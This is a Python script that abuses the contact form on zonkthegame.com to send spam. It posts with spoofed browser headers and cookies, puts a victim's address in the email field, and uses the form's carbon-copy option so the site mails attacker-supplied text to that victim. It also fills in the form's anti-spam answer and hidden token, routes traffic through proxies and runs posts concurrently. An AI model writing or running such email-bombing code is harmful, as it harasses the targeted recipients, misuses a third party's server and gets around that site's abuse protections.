from os.path import basename

import requests

from module import Spam

cookies = {
    '__utma': '37265451.1585702992.1677662293.1677662293.1677662293.1',
    '__utmc': '37265451',
    '__utmz': '37265451.1677662293.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__gads': 'ID=a4b5d427f329ea20-22291acd38dd006b:T=1677662294:RT=1677662294:S=ALNI_MZ6BPeb0jNKLWTzWbbhpV5s7uLYuA',
    '__gpi': 'UID=000009c5ee3d429d:T=1677662294:RT=1677662294:S=ALNI_MYuWUBUbWuOYCZ6Ss3CNRZzYMewqA',
    '__utmt': '1',
    '__utmb': '37265451.3.10.1677662293',
}

headers = {
    'authority': 'www.zonkthegame.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '__utma=37265451.1585702992.1677662293.1677662293.1677662293.1; __utmc=37265451; __utmz=37265451.1677662293.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __gads=ID=a4b5d427f329ea20-22291acd38dd006b:T=1677662294:RT=1677662294:S=ALNI_MZ6BPeb0jNKLWTzWbbhpV5s7uLYuA; __gpi=UID=000009c5ee3d429d:T=1677662294:RT=1677662294:S=ALNI_MYuWUBUbWuOYCZ6Ss3CNRZzYMewqA; __utmt=1; __utmb=37265451.3.10.1677662293',
    'origin': 'https://www.zonkthegame.com',
    'pragma': 'no-cache',
    'referer': 'https://www.zonkthegame.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Success'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': 'name',
            'email': target,
            'subject': 'Comment',
            'message': self.get_text(),
            'antispam': 'hot',
            'honeypot': '',
            'hidden': 'fkb32f9af59c6eec20e599d0cb96004782idc4926fd2708d5126b019babbf713087fmc',
            'cc-opt': 'cc',
            'IDC4926FD2708D5126B019BABBF713087FMC': 'Send Mail',
        }

        response = requests.post('https://www.zonkthegame.com/contact.php', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
